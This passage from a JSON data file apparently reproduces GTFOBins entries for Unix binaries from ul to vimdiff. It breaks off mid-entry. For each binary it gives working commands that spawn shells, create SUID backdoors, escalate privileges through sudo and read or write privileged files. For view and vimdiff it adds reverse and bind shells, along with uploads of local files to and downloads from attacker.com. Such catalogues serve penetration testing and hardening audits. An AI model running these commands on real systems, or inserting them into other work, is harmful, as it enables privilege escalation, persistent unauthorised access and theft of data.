                        "code": "sudo install -m =xs $(which ul) .\n\nLFILE=file_to_read\n./ul \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo ul \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "unexpand",
        "url": "https://gtfobins.github.io/gtfobins/unexpand/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nunexpand -t99999999 \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which unexpand) .\n\nLFILE=file_to_read\n./unexpand -t99999999 \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo unexpand -t99999999 \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "uniq",
        "url": "https://gtfobins.github.io/gtfobins/uniq/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                        "sub_description": "The read file content is corrupted by squashing multiple adjacent lines."
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nuniq \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which uniq) .\n\nLFILE=file_to_read\n./uniq \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo uniq \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "unshare",
        "url": "https://gtfobins.github.io/gtfobins/unshare/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "unshare /bin/sh"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which unshare) .\n\n./unshare -r /bin/sh"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo unshare /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "unsquashfs",
        "url": "https://gtfobins.github.io/gtfobins/unsquashfs/",
        "functions": [
            {
                "function": "info",
                "description": "unsquashfs preserve the SUID bit when extracting the file system. Prepare an archive beforehand with the following commands as root:",
                "examples": [
                    {
                        "code": "cp /bin/sh .\nchmod +s sh\nmksquashfs sh shell",
                        "description": "Extract it on the target, then run the SUID shell as usual (omitting the -p where appropriate)."
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which unsquashfs) .\n\n./unsquashfs shell\n./squashfs-root/sh -p"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo unsquashfs shell\n./squashfs-root/sh -p"
                    }
                ]
            }
        ]
    },
    {
        "name": "unzip",
        "url": "https://gtfobins.github.io/gtfobins/unzip/",
        "functions": [
            {
                "function": "info",
                "description": "Certain unzip versions allows to preserve the SUID bit. Prepare an archive beforehand with the following commands as root:",
                "examples": [
                    {
                        "code": "cp /bin/sh .\nchmod +s sh\nzip shell.zip sh",
                        "description": "Extract it on the target, then run the SUID shell as usual (omitting the -p where appropriate)."
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which unzip) .\n\n./unzip -K shell.zip\n./sh -p"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo unzip -K shell.zip\n./sh -p"
                    }
                ]
            }
        ]
    },
    {
        "name": "uudecode",
        "url": "https://gtfobins.github.io/gtfobins/uudecode/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which uudecode) .\n\nLFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo uuencode \"$LFILE\" /dev/stdout | uudecode"
                    }
                ]
            }
        ]
    },
    {
        "name": "update-alternatives",
        "url": "https://gtfobins.github.io/gtfobins/update-alternatives/",
        "functions": [
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "Write in $LFILE a symlink to $TF.",
                        "code": "sudo install -m =xs $(which update-alternatives) .\n\nLFILE=/path/to/file_to_write\nTF=$(mktemp)\necho DATA >$TF\n./update-alternatives --force --install \"$LFILE\" x \"$TF\" 0"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "Write in $LFILE a symlink to $TF.",
                        "code": "LFILE=/path/to/file_to_write\nTF=$(mktemp)\necho DATA >$TF\nsudo update-alternatives --force --install \"$LFILE\" x \"$TF\" 0"
                    }
                ]
            }
        ]
    },
    {
        "name": "vagrant",
        "url": "https://gtfobins.github.io/gtfobins/vagrant/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                        "description": "This allows to execute ruby code, other functions may apply."
                    }
                ]
            },
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "cd $(mktemp -d)\necho 'exec \"/bin/sh\"' > Vagrantfile\nvagrant up"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which vagrant) .\n\ncd $(mktemp -d)\necho 'exec \"/bin/sh -p\"' > Vagrantfile\nvagrant up"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "cd $(mktemp -d)\necho 'exec \"/bin/sh\"' > Vagrantfile\nvagrant up"
                    }
                ]
            }
        ]
    },
    {
        "name": "uuencode",
        "url": "https://gtfobins.github.io/gtfobins/uuencode/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which uuencode) .\n\nLFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo uuencode \"$LFILE\" /dev/stdout | uudecode"
                    }
                ]
            }
        ]
    },
    {
        "name": "valgrind",
        "url": "https://gtfobins.github.io/gtfobins/valgrind/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "valgrind /bin/sh"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo valgrind /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "varnishncsa",
        "url": "https://gtfobins.github.io/gtfobins/varnishncsa/",
        "functions": [
            {
                "function": "info",
                "examples": [
                    {
                        "description": "This allows to write arbitrary files as root, provided that the proper HTTP response is made. Specifically the content of a certain header will be written in the file. First start varnishncsa as follows, then trigger the file write with:",
                        "code": "curl -H 'yyy: DATA' http://localhost:6081/xxx"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which varnishncsa) .\n\nLFILE=file_to_write\n./varnishncsa -g request -q 'ReqURL ~ \"/xxx\"' -F '%{yyy}i' -w \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_write\nsudo varnishncsa -g request -q 'ReqURL ~ \"/xxx\"' -F '%{yyy}i' -w \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "vi",
        "url": "https://gtfobins.github.io/gtfobins/vi/",
        "functions": [
            {
                "function": "info",
                "examples": [
                    {
                        "sub_description": "Modern Unix systems run vim binary when vi is called."
                    }
                ]
            },
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "vi -c ':!/bin/sh' /dev/null"
                    },
                    {
                        "description": "",
                        "code": "vi\n:set shell=/bin/sh\n:shell"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "vi file_to_write\niDATA\n^[\nw"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "vi file_to_read"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo vi -c ':!/bin/sh' /dev/null"
                    }
                ]
            }
        ]
    },
    {
        "name": "view",
        "url": "https://gtfobins.github.io/gtfobins/view/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "view -c ':!/bin/sh'"
                    },
                    {
                        "description": "",
                        "code": "view\n:set shell=/bin/sh\n:shell"
                    },
                    {
                        "description": "This requires that view is compiled with Python support. Prepend :py3 for Python 3.",
                        "code": "view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
                    },
                    {
                        "description": "This requires that view is compiled with Lua support.",
                        "code": "view -c ':lua os.execute(\"reset; exec sh\")'"
                    }
                ]
            },
            {
                "function": "Reverse shell",
                "description": "It can send back a reverse shell to a listening attacker to open a remote network access.",
                "examples": [
                    {
                        "description": "This requires that view is compiled with Python support. Prepend :py3 for Python 3. Run socat file:`tty`,raw,echo=0 tcp-listen:12345 on the attacker box to receive the shell.",
                        "code": "export RHOST=attacker.com\nexport RPORT=12345\nview -c ':py import vim,sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")\nvim.command(\":q!\")'"
                    }
                ]
            },
            {
                "function": "Non-interactive reverse shell",
                "description": "It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.",
                "examples": [
                    {
                        "description": "Run nc -l -p 12345 on the attacker box to receive the shell. This requires that view is compiled with Lua support and that lua-socket is installed.",
                        "code": "export RHOST=attacker.com\nexport RPORT=12345\nview -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'"
                    }
                ]
            },
            {
                "function": "Non-interactive bind shell",
                "description": "It can bind a non-interactive shell to a local port to allow remote network access.",
                "examples": [
                    {
                        "description": "Run nc target.com 12345 on the attacker box to connect to the shell. This requires that view is compiled with Lua support and that lua-socket is installed.",
                        "code": "export LPORT=12345\nview -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'"
                    }
                ]
            },
            {
                "function": "File upload",
                "description": "It can exfiltrate files on the network.",
                "examples": [
                    {
                        "description": "This requires that view is compiled with Python support. Prepend :py3 for Python 3. Send local file via “d” parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.",
                        "code": "export URL=http://attacker.com/\nexport LFILE=file_to_send\nview -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))\nvim.command(\":q!\")'"
                    },
                    {
                        "description": "This requires that view is compiled with Python support. Prepend :py3 for Python 3. Serve files in the local folder running an HTTP server.",
                        "code": "export LPORT=8888\nview -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()\nvim.command(\":q!\")'"
                    },
                    {
                        "description": "Send a local file via TCP. Run nc -l -p 12345 > \"file_to_save\" on the attacker box to collect the file. This requires that view is compiled with Lua support and that lua-socket is installed.",
                        "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nview -c ':lua local f=io.open(os.getenv(\"LFILE\"), 'rb')\n  local d=f:read(\"*a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  t:send(d);\n  t:close();'"
                    }
                ]
            },
            {
                "function": "File download",
                "description": "It can download remote files.",
                "examples": [
                    {
                        "description": "This requires that view is compiled with Python support. Prepend :py3 for Python 3. Fetch a remote file via HTTP GET request.",
                        "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nview -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])\nvim.command(\":q!\")'"
                    },
                    {
                        "description": "Fetch a remote file via TCP. Run nc target.com 12345 < \"file_to_send\" on the attacker box to send the file. This requires that view is compiled with Lua support and that lua-socket is installed.",
                        "code": "export LPORT=12345\nexport LFILE=file_to_save\nview -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(os.getenv(\"LFILE\"), \"wb\");\n  f:write(d);\n  io.close(f);'"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "view file_to_write\niDATA\n^[\nw!"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "view file_to_read"
                    }
                ]
            },
            {
                "function": "Library load",
                "description": "It loads shared libraries that may be used to run code in the binary execution context.",
                "examples": [
                    {
                        "description": "This requires that view is compiled with Python support. Prepend :py3 for Python 3.",
                        "code": "view -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "This requires that view is compiled with Python support. Prepend :py3 for Python 3.",
                        "code": "sudo install -m =xs $(which view) .\n\n./view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo view -c ':!/bin/sh'"
                    },
                    {
                        "description": "This requires that view is compiled with Python support. Prepend :py3 for Python 3.",
                        "code": "sudo view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
                    },
                    {
                        "description": "This requires that view is compiled with Lua support.",
                        "code": "sudo view -c ':lua os.execute(\"reset; exec sh\")'"
                    }
                ]
            },
            {
                "function": "Capabilities",
                "description": "If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.",
                "examples": [
                    {
                        "description": "This requires that view is compiled with Python support. Prepend :py3 for Python 3.",
                        "code": "cp $(which view) .\nsudo setcap cap_setuid+ep view\n\n./view -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "This requires that view is compiled with Lua support.",
                        "code": "sudo install -m =xs $(which view) .\n\n./view -c ':lua os.execute(\"reset; exec sh\")'"
                    }
                ]
            }
        ]
    },
    {
        "name": "vigr",
        "url": "https://gtfobins.github.io/gtfobins/vigr/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                        "sub_description": "This command allows to edit some designated files (/etc/passwd, /etc/group, /etc/shadow and /etc/gshadow) safely by spawning the default editor (falling back to vim, other functions may apply). Despite requiring superuser privileges to run, the editor is executed as the unprivileged user when run as SUID or with sudo."
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which vigr) .\n\n./vigr"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo vigr"
                    }
                ]
            }
        ]
    },
    {
        "name": "vimdiff",
        "url": "https://gtfobins.github.io/gtfobins/vimdiff/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "vimdiff -c ':!/bin/sh'"
                    },
                    {
                        "description": "",
                        "code": "vimdiff\n:set shell=/bin/sh\n:shell"
                    },
                    {
                        "description": "This requires that vimdiff is compiled with Python support. Prepend :py3 for Python 3.",
                        "code": "vimdiff -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
                    },
                    {
                        "description": "This requires that vimdiff is compiled with Lua support.",
                        "code": "vimdiff -c ':lua os.execute(\"reset; exec sh\")'"
                    }
                ]
            },
            {
                "function": "Reverse shell",
                "description": "It can send back a reverse shell to a listening attacker to open a remote network access.",
                "examples": [
                    {
                        "description": "This requires that vimdiff is compiled with Python support. Prepend :py3 for Python 3. Run socat file:`tty`,raw,echo=0 tcp-listen:12345 on the attacker box to receive the shell.",
                        "code": "export RHOST=attacker.com\nexport RPORT=12345\nvimdiff -c ':py import vim,sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")\nvim.command(\":q!\")'"
                    }
                ]
            },
            {
                "function": "Non-interactive reverse shell",
                "description": "It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.",
                "examples": [
                    {
                        "description": "Run nc -l -p 12345 on the attacker box to receive the shell. This requires that vimdiff is compiled with Lua support and that lua-socket is installed.",
                        "code": "export RHOST=attacker.com\nexport RPORT=12345\nvimdiff -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'"
                    }
                ]
            },
            {
                "function": "Non-interactive bind shell",
                "description": "It can bind a non-interactive shell to a local port to allow remote network access.",
                "examples": [
                    {
                        "description": "Run nc target.com 12345 on the attacker box to connect to the shell. This requires that vimdiff is compiled with Lua support and that lua-socket is installed.",
                        "code": "export LPORT=12345\nvimdiff -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'"
                    }
                ]
            },
            {
                "function": "File upload",
                "description": "It can exfiltrate files on the network.",
                "examples": [
                    {
                        "description": "This requires that vimdiff is compiled with Python support. Prepend :py3 for Python 3. Send local file via “d” parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.",
                        "code": "export URL=http://attacker.com/\nexport LFILE=file_to_send\nvimdiff -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))\nvim.command(\":q!\")'"
                    },
                    {
                        "description": "This requires that vimdiff is compiled with Python support. Prepend :py3 for Python 3. Serve files in the local folder running an HTTP server.",
                        "code": "export LPORT=8888\nvimdiff -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()\nvim.command(\":q!\")'"
                    },
                    {
                        "description": "Send a local file via TCP. Run nc -l -p 12345 > \"file_to_save\" on the attacker box to collect the file. This requires that vimdiff is compiled with Lua support and that lua-socket is installed.",
                        "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nvimdiff -c ':lua local f=io.open(os.getenv(\"LFILE\"), 'rb')\n  local d=f:read(\"*a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  t:send(d);\n  t:close();'"
                    }
                ]
            },
            {
                "function": "File download",
                "description": "It can download remote files.",
                "examples": [
                    {
                        "description": "This requires that vimdiff is compiled with Python support. Prepend :py3 for Python 3. Fetch a remote file via HTTP GET request.",
                        "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nvimdiff -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])\nvim.command(\":q!\")'"
                    },
                    {
                        "description": "Fetch a remote file via TCP. Run nc target.com 12345 < \"file_to_send\" on the attacker box to send the file. This requires that vimdiff is compiled with Lua support and that lua-socket is installed.",
                        "code": "export LPORT=12345\nexport LFILE=file_to_save\nvimdiff -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(os.getenv(\"LFILE\"), \"wb\");\n  f:write(d);\n  io.close(f);'"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "vimdiff file_to_write\niDATA\n^[\nw"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "vimdiff file_to_read"
                    }
                ]
            },
            {
                "function": "Library load",
                "description": "It loads shared libraries that may be used to run code in the binary execution context.",
                "examples": [
                    {
